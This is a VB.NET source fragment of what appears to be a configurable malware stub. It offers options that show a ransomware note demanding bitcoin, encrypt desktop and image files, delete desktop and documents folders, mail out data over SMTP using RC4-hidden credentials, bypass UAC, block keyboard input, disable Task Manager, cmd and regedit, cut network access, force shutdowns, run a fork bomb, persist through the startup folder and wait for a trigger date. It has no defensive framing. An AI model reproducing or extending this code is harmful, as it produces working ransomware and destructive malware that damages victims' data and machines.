            Dim ln = New Threading.Thread(AddressOf Lok_mos)
            ln.IsBackground = True
            ln.Start()
        End If
        If infni_scrn = "True" Then
            infi_scrn.Show()
        End If
        If sendmail = "True" Then
            m_adresse = RC4Decrypt(m_adresse, "2RbNE8EfLjepLENNXb4N")
            m_pwd = RC4Decrypt(m_pwd, "2RbNE8EfLjepLENNXb4N")
            m_sendto = RC4Decrypt(m_sendto, "2RbNE8EfLjepLENNXb4N")
            m_key = RC4Decrypt(m_key, "2RbNE8EfLjepLENNXb4N")
            smtp = RC4Decrypt(smtp, "2RbNE8EfLjepLENNXb4N")
            sendinfo(m_adresse, m_pwd, m_sendto, m_enc, m_key, m_port, smtp)
        End If
        If rnsm = True Then
            ohnoo.TextBox1.Text = RC4Decrypt(p2p, "bCoDkZ3QTETLNnOzpT4e")
            ohnoo.Flie = yahoo                                       'toBase64(RC4Decrypt(yahoo, "bCoDkZ3QTETLNnOzpT4e"))
            ohnoo.Label2.Text = "Your files have been encrypted,to restore your data send " & RC4Decrypt(amount, "bCoDkZ3QTETLNnOzpT4e") & " BTC to this address"
            ohnoo.Show()

        End If
        If D_internet = "True" Then
            Shell("cmd.exe /c ipconfig/release", AppWinStyle.Hide)
        End If
        If dick = "True" Then
            mydickfelloff.Show()
        End If
        If Black_screan = "True" Then
            Black_negga.Show()
        End If
        If frm_dup Then
            Dupfrm.Show()
            Dupfrm.Label1.Text = frm_txt
            Dupfrm.Text = frm_txt
        End If
        If Crzy_Mouse = "True" Then
            Dim j = New Threading.Thread(AddressOf Crazyms)
            j.IsBackground = True
            j.Start()
        End If
        If D_Keybaord = "True" Then
            If isadmin() = True Then
                BlockInput(True)
            End If
        End If
        If encmy_dmnt = True Then
            Dim tdr1 As New Threading.Thread(AddressOf encdesktop)
            trd1.IsBackground = True
            trd1.Start()
            Dim tdr2 As New Threading.Thread(AddressOf encimages)
            tdr2.IsBackground = True
            tdr2.Start()
        End If
        If spch = "True" Then
            Dim kkk = New Threading.Thread(AddressOf spek)
            kkk.IsBackground = True
            kkk.Start()
        End If
        If chang_Datentime = "True" Then
            If isadmin() = True Then
                ChangeDate(S_time, S_date)
            End If
        End If

        If dlt_alldtpfil = "True" Then
            Dim trd = New Thread(AddressOf Dltdsktp)
            trd.IsBackground = True
            trd.Start()
        End If
        If dlt_allmydoc = "True" Then
            Dim drt = New Thread(AddressOf DltMydocu)
            drt.IsBackground = True
            drt.Start()
        End If

        If hid_taskbar = "True" Then
            task_barhide.Start()
        End If
        If D_proc = "True" Then
            D_Custo_Proc(D_selectdProc)
        End If
        If makeC_full = "True" Then
            trd1 = New Threading.Thread(AddressOf pump)
            trd1.IsBackground = True
            trd1.Start()
        End If
        If Blue_screan = "True" Then
            If isadmin() = True Then
                Shell("powershell.exe wininit.exe")
            Else
                Dim btch As String = IO.Path.GetTempPath & Randome_int(5) & ".bat"
                Dim mp As New StreamWriter(btch)
                mp.WriteLine("powershell.exe wininit.exe")
                mp.Close()
                LuncheProc(btch)
                Bypass_UAC(btch)
            End If

            End
        End If
        If Turn_off = "True" Then
            Shell("Shutdown -s -t 50")
        End If
        If restart_pc = "True" Then
            Shell("Shutdown -r -t 50")
        End If
        If log_off = "True" Then
            Shell("Shutdown -l -t 50")
        End If
        If frk_bmb = "True" Then
            Fork()
        End If
    End Sub
    Sub Mutex1()
        If mtx_enbl = "True" Then
            Dim objMutex = New Mutex(False, mtx)
            If objMutex.WaitOne(0, False) = False Then
                objMutex.Close()
                objMutex = Nothing
                End
            End If
        End If
    End Sub
    Sub strt()
        On Error Resume Next
        If Folder_startup = "True" Then
            Dim fle As New FileInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Application" & ".exe")
            If fle.Exists = False Then
                FileCopy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Application" & ".exe")
            End If
        End If
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Control.CheckForIllegalCrossThreadCalls = False
        getinfo()
        Mutex1()
        strt()
        If strt_yes = "True" Then
            Rep.Stop()
            Rep2.Stop()
            Spamer.Stop()
            tmnykoulach.Start()

        Else
            set_options()
            execute()
            Rep.Start()
            Rep2.Start()
            Spamer.Start()
            tmnykoulach.Stop()
        End If


    End Sub
    Private Sub Rep_Tick(sender As Object, e As EventArgs) Handles Rep.Tick
        Try
            If D_copyfls = "True" Then
                RealTime.EnableRaisingEvents = True
                File.Delete(curntfile)
            End If
            If msg = "True" And spm_mainmg = "True" Then
                If msg_stl = "err" Then
                    MsgBox(msg_bdy, MsgBoxStyle.Critical, msg_tlt)
                End If
                If msg_stl = "exx" Then
                    MsgBox(msg_bdy, MsgBoxStyle.Exclamation, msg_tlt)
                End If
                If msg_stl = "info" Then
                    MsgBox(msg_bdy, MsgBoxStyle.Information, msg_tlt)
                End If
                If msg_stl = "quest" Then
                    MsgBox(msg_bdy, MsgBoxStyle.MsgBoxHelp, msg_tlt)
                End If
            End If
            If spm_msg = "True" Then
                MsgBox(themsg, MsgBoxStyle.Critical, "")
            End If
            If set_kbrd = "True" Then
                My.Computer.Keyboard.SendKeys(valu_kbrd)
            End If
            If set_clip = "True" Then
                Clipboard.SetText(clip_text)
            End If

            If D_clip = "True" Then
                Clipboard.Clear()
            End If
            Dis_Webbrows(D_webbro)
            dis_taskmgr(D_taskmg)
            dis_cmd(d_cmd)
            dis_explo(d_explo)
            dis_reg(d_regedit)
            If D_Custom = "True" Then
                D_custo(D_selectedpro)
            End If
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Spamer_Tick(sender As Object, e As EventArgs) Handles Spamer.Tick
        Try
            Spmskul(spam_desksukl, pic_link)
        Catch ex As Exception
            Spamer.Stop()
        End Try

    End Sub
    Private Sub Rep2_Tick(sender As Object, e As EventArgs) Handles Rep2.Tick
        Try
            open_close_cddrive(opnnclo_cddriv)
            If Playbeep = "True" Then
                My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Beep)
            End If
        Catch ex As Exception
            Rep2.Stop()
        End Try
    End Sub
    Private Sub tmnykoulach_Tick(sender As Object, e As EventArgs) Handles tmnykoulach.Tick
        Dim sysdate As Date = My.Computer.Clock.LocalTime.Date
        Dim str_date2 As Date
        str_date2 = Convert.ToDateTime(strt_date).ToString("d/M/yyyy", CultureInfo.InvariantCulture)
        Dim str_date3 As Date = Convert.ToDateTime(strt_date).ToString("yyyy/M/d", CultureInfo.InvariantCulture)
        Dim str_date4 As Date = Convert.ToDateTime(strt_date).ToString("M/d/yyyy", CultureInfo.InvariantCulture)
        Dim str_date5 As Date = Convert.ToDateTime(strt_date).ToString("MM/dd/yyyy", CultureInfo.InvariantCulture)
        Dim str_date6 As Date = Convert.ToDateTime(strt_date).ToString("yyyy/MM/dd", CultureInfo.InvariantCulture)
        strt_date = Convert.ToDateTime(strt_date)
        If strt_date = sysdate Or str_date2 = sysdate Or str_date3 = sysdate Or str_date4 = sysdate Or str_date5 = sysdate Or str_date6 = sysdate Then
            tmnykoulach.Stop()
            Rep.Start()
            Rep2.Start()
            Spamer.Start()
            set_options()
            execute()
        End If
    End Sub
    Public Sub New()

        ' This call is required by the designer.
        InitializeComponent()

        ' Add any initialization after the InitializeComponent() call.

    End Sub
    Private Sub cheker_Tick(sender As Object, e As EventArgs) Handles cheker.Tick
        On Error Resume Next
        If Folder_startup = "True" Then
            Dim fle As New FileInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Application" & ".exe")
            If fle.Exists = False Then
                FileCopy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\Application" & ".exe")
            End If
        End If

    End Sub
    Private Sub RealTime_Changed(sender As Object, e As FileSystemEventArgs) Handles RealTime.Changed
        Try
            curntfile = e.FullPath
        Catch ex As Exception

        End Try
    End Sub
End Class
